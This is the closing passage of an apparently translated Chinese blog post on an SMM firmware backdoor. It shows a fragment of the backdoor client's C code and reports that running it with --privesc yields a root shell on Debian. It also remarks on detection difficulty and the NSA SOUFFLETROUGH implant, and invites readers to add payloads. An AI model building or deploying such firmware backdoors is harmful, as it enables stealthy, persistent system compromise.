returns 0x%x\n&quot;, command, code);</span><br><span class="line">                return code;</span><br><span class="line">            &#125;       </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    else</span><br><span class="line">    &#123;</span><br><span class="line">        // ... skipped ...</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    return ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>现在，当我们编译这个后门客户端并使用–privesc参数运行时，它会弹出root权限shell。在3.2.60内核的Debian Wheezy上的提权示例(在顶部控制台窗口你可以看到 从后门通过COM端口接收到的 SMI派遣的调试消息)：</p>
<p><img src="https://myimage-1254411429.cos.ap-chengdu.myqcloud.com/image-20230809161852270.png" alt="image-20230809161852270"></p>
<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>很难在操作系统中检测到这样的SMM后门，SMRAM是不可访问的，而这一切都是可以用简单的方式完成 —— 检查硬件配置是否启用了固件通常不使用的可疑SPI源(如APIC timer等)。然而，这是另一个工具和另一篇文章的好主题。<br>在现实世界中有机会遇到任何SMM恶意软件吗？嗯，至少可能性不是0，例如NSA泄露的文件中提到了<a target="_blank" rel="noopener" href="https://www.schneier.com/blog/archives/2014/01/souffletrough_n.html">mentions the SOUFFLETROUGH project</a> —— 植入Juniper防火墙的BIOS，利用SMM的优势在操作系统中隐藏它的代码。<br>至于我的SMM后门的改进——实现网络流量拦截和注入绝对是一件有趣的事情。我相信， 使用I&#x2F;O指令重启CPU功能 实现hook网卡驱动执行流并不难——我计划在未来的某一天深入研究这个方向。<br>故事结束。下载源代码，在你自己的硬件上测试后门，添加一些自定义的payload，享受乐趣并告诉大家你的发现吧:)</p>

        
      </div>

         
    </div>
    
     
  </div>
  
    
<nav id="article-nav">
  <a class="article-nav-btn left "
    
      href="/project/2023/08/09/UEFI-%E5%BC%95%E5%AF%BC%E8%84%9A%E6%9C%AC%E8%A1%A8%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/"
      title="UEFI 引导脚本表漏洞利用"
     >
    <i class="fa-solid fa-angle-left"></i>
    <p class="title-text">
      
        UEFI 引导脚本表漏洞利用
        
    </p>
  </a>
  <a class="article-nav-btn right "
    
      href="/project/2023/08/09/P4wnP1%E9%85%8D%E7%BD%AE%E4%B8%8E%E4%BD%BF%E7%94%A8/"
      title="P4wnP1配置与使用"
     >

    <p class="title-text">
      
        P4wnP1配置与使用
        
    </p>
    <i class="fa-solid fa-angle-right"></i>
  </a>
</nav>


  
</article>


  
  <script src='//unpkg.com/valine/dist/Valine.min.js'></script>
  <div id="comment-card" class="comment-card">
    <div class="main-title-bar">
      <div class="main-title-dot"></div>
      <div class="main-title">留言 </div>
    </div>
    <div id="vcomments"></div>
  </div>
  <script>
      new Valine({"enable":true,"appId":"bC8HOSKa4QB7G6TfuGWB97i4-gzGzoHsz","appKey":"aoDFuSX5vWN8Xn1ukZpJ50be","placeholder":"写下你的评论...","pageSize":10,"highlight":true,"serverURLs":null,"el":"#vcomments"});
  </script>
 
    </div>
    <div id="footer-wrapper">
      <footer id="footer">
  
  <div id="footer-info" class="inner">
    
    &copy; 2023 Edvison<br>
    Powered by <a href="https://hexo.io/" target="_blank">Hexo</a> & Theme <a target="_blank" rel="noopener" href="https://github.com/saicaca/hexo-theme-vivia">Vivia</a>
  </div>
</footer>

    </div>
    <div class="back-to-top-wrapper">
    <button id="back-to-top-btn" class="back-to-top-btn" onclick="topFunction()">
        <span class="material-symbols-rounded">keyboard_arrow_up</span>
    </button>
</div>

<script>
    function topFunction() {
        window.scroll({ top: 0, behavior: 'smooth' });
    }
    let btn = document.getElementById('back-to-top-btn');
    function scrollFunction() {
        if (document.body.scrollTop > 600 || document.documentElement.scrollTop > 600) {
            btn.style.opacity = 1;
        } else {
            btn.style.opacity = 0;
        }
    }
    window.onscroll = function() {
        scrollFunction();
    }
</script>

  </div>
  <script src="/project/js/light-dark-switch.js"></script>
</body>
</html>
